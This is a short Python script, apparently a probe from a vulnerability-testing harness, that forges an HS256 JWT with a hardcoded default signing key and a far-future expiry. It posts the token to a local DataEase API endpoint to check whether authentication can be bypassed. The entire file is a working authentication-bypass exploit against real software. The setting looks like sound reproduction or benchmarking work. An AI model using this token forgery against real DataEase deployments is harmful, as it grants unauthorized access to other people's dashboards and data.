#!/usr/bin/env python3
"""Method-side executable probe: forge the seed JWT and hit real DataEase HTTP.

Usage: python3 seed_exec.py <candidate.json> [version]
Requires PCB_TARGET_PORT (published host port for dataease :8100).
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import sys
import time
import urllib.error
import urllib.request


def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def forge(key: str, claims: dict) -> str:
    header = {"typ": "JWT", "alg": "HS256"}
    seg = b64url(json.dumps(header, separators=(",", ":")).encode()) + "." + \
          b64url(json.dumps(claims, separators=(",", ":")).encode())
    sig = hmac.new(key.encode(), seg.encode(), hashlib.sha256).digest()
    return seg + "." + b64url(sig)


def run_probe(candidate, *, version="v1"):
    port = os.environ.get("PCB_TARGET_PORT") or ""
    if not port:
        return {"error": "no PCB_TARGET_PORT", "status": 0, "body": ""}
    key = candidate.get("key") or "83d923c9f1d8fcaa46cae0ed2aaa81b5"
    uid = int(candidate.get("uid") or 1)
    oid = int(candidate.get("oid") or 1)
    path = candidate.get("path") or "/de2api/dataVisualization/findById"
    header = candidate.get("header") or "X-DE-TOKEN"
    body_obj = candidate.get("body") or {"id": 777000777, "busiFlag": "dashboard"}
    tok = forge(key, {"uid": uid, "oid": oid, "exp": int(time.time()) + 10 ** 9})
    raw = json.dumps(body_obj).encode()
    url = f"http://127.0.0.1:{int(port)}{path}"
    req = urllib.request.Request(url, data=raw, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header(header, tok)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            text = r.read().decode("utf-8", "replace")
            status = r.status
    except urllib.error.HTTPError as e:
        text = e.read().decode("utf-8", "replace")
        status = e.code
    except Exception as e:
        return {"error": f"transport: {e!r}", "status": 0, "body": "", "version": version}
    return {"version": version, "status": status, "body": text,
            "probe_id": candidate.get("probe_id")}


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))
    if r.get("error"):
        sys.exit(1)
